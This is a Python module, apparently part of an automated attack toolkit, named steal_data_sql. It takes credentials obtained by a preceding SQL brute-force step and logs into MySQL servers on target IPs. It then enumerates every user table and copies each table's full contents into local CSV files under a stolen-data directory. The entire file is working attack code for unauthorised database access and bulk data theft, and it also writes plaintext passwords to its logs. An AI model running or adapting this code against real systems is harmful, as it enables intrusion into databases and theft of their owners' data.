"""
steal_data_sql.py - This script connects to SQL servers using provided credentials, discovers tables, and extracts data to local CSV files.
"""

import os
import csv
import logging
import time
from sqlalchemy import create_engine, text
from threading import Timer
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)

b_class = "StealDataSQL"
b_module = "steal_data_sql"
b_status = "steal_data_sql"
b_parent = "SQLBruteforce"
b_port = 3306


class StealDataSQL(BaseSteal):
    protocol_name = "sql"
    credential_file_attr = "sqlfile"

    def connect(self, ip, username, password):
        return self.connect_sql(ip, username, password)

    def find_items(self, conn, dir_path):
        return self.find_tables(conn)

    def steal_item(self, conn, remote_item, local_dir):
        table, schema = remote_item
        self.steal_data(conn, table, schema, local_dir)

    def connect_sql(self, ip, username, password, database=None):
        try:
            db_part = f"/{database}" if database else ""
            connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306{db_part}"
            engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
            self.sql_connected = True
            logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
            return engine
        except Exception as e:
            logger.error(f"SQL connection error for {ip} with user '{username}' and password '{password}'" + (f" to database {database}" if database else "") + f": {e}")
            return None

    def find_tables(self, engine):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Table search interrupted due to orchestrator exit.")
                return []
            query = """
            SELECT TABLE_NAME, TABLE_SCHEMA 
            FROM INFORMATION_SCHEMA.TABLES 
            WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
            AND TABLE_TYPE = 'BASE TABLE'
            """
            with engine.connect() as conn:
                result = conn.execute(text(query))
                tables = [(row[0], row[1]) for row in result.fetchall()]
            logger.info(f"Found {len(tables)} tables across all databases")
            return tables
        except Exception as e:
            logger.error(f"Error finding tables: {e}")
            return []

    def steal_data(self, engine, table, schema, local_dir):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Data stealing process interrupted due to orchestrator exit.")
                return
            query = f"SELECT * FROM {schema}.{table}"
            with engine.connect() as conn:
                result = conn.execute(text(query))
                local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
                with open(local_file_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(result.keys())
                    writer.writerows(result.fetchall())
            logger.success(f"Downloaded data from table {schema}.{table} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading data from table {schema}.{table}: {e}")

    def execute(self, ip, port, row, status_key):
        try:
            if self.b_parent_action:
                if 'success' not in row.get(self.b_parent_action, ''):
                    return 'skipped'

            self.shared_data.orch_status = "StealDataSQL"
            time.sleep(5)
            logger.info(f"Stealing data from {ip}:{port}...")

            sqlfile = self.shared_data.sqlfile
            credentials = []
            if os.path.exists(sqlfile):
                with open(sqlfile, 'r', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    credentials = [(row['User'], row['Password'], row['Database'])
                                 for row in reader if row['IP Address'] == ip]
                logger.info(f"Found {len(credentials)} credential combinations for {ip}")

            if not credentials:
                logger.error(f"No valid credentials found for {ip}. Skipping...")
                return 'failed'

            def timeout():
                if not self.sql_connected:
                    logger.error(f"No SQL connection established within 4 minutes for {ip}. Marking as failed.")
                    self.stop_execution = True

            timer = Timer(240, timeout)
            timer.start()

            success = False
            for username, password, database in credentials:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    logger.info("Steal data execution interrupted.")
                    break
                try:
                    logger.info(f"Trying credential {username}:{password} for {ip} on database {database}")
                    engine = self.connect_sql(ip, username, password)
                    if engine:
                        tables = self.find_tables(engine)
                        mac = row['MAC Address']
                        local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
                        os.makedirs(local_dir, exist_ok=True)

                        if tables:
                            for table, schema in tables:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    break
                                db_engine = self.connect_sql(ip, username, password, schema)
                                if db_engine:
                                    self.steal_data(db_engine, table, schema, local_dir)
                            success = True
                            counttables = len(tables)
                            logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")

                        if success:
                            timer.cancel()
                            return 'success'
                except Exception as e:
                    logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")

            if not success:
                logger.error(f"Failed to steal any data from {ip}:{port}")
                return 'failed'
            else:
                return 'success'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal_data_sql = StealDataSQL(shared_data)
        logger.info("[bold green]Starting SQL data extraction process[/bold green]")

        ips_to_process = shared_data.read_data()

        for row in ips_to_process:
            ip = row["IPs"]
            steal_data_sql.execute(ip, b_port, row, b_status)

    except Exception as e:
        logger.error(f"Error in main execution: {e}")
